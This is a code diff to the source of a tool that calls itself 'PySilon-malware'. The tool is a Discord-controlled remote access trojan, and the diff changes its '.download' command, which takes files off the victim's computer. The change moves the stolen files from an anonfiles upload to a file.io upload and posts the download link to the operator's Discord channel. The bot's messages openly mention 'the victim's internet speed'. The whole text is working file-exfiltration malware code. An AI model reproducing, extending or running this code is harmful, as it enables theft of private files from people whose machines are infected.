@@ -13,7 +13,7 @@ elif message.content[:9] == '.download':
         if message.content == '.download':
             #.log Author issued empty ".download" command 
             embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
-            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             #.log Sent embed about usage of ".download" 
         else:
@@ -34,30 +34,31 @@ elif message.content[:9] == '.download':
                                 message.channel.send(e)
                                 #.log Sent message with information about this error. Aborting operation 
                                 pass
-                embed = discord.Embed(title="🟢 Success",description=f'```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```', colour=discord.Colour.green())
-                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
-                await message.channel.send(embed=embed)
-                #.log Sent message about Anonfiles upload 
-                files = {
-                    'file': (f'{message.content[10:]}.zip', open(f'{target_file}', 'rb')),
+                await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..```")
+                #.log Sent message about File.io upload 
+                data = {
+                    'file': open(target_file, 'rb')
                 }
-                url = 'https://api.anonfiles.com/upload'
-                #.log Set up required things for Anonfiles upload 
-                response = requests.post(url, files=files)
-                #.log Uploaded the file onto Anonfiles 
+                url = 'https://file.io/'
+                #.log Set up required things for File.io upload 
+                response = requests.post(url, files=data)
+                #.log Uploaded the file onto File.io
                 data = response.json()
-                #.log Received response from Anonfiles 
-                await message.channel.send(f"```{message.content[10:]}.zip:``` {data['data']['file']['url']['short']}")
-                #.log Sent Anonfiles link to uploaded file 
+                #.log Received response from File.io 
+                embed = discord.Embed(title=f"🟢 {message.content[10:]}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
+                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                await message.channel.send(embed=embed)
+                #.log Sent Anonfiles link to uploaded file
+                await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
             else:
                 #.log File requested by Author does not exist on this PC 
                 embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
-                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                 reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                 #.log Sent embed about missing file 
     else:
         #.log Message is not sent on file-related channel 
         embed = discord.Embed(title="📛 Error",description=f'_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         #.log Sent embed about wrong channel 
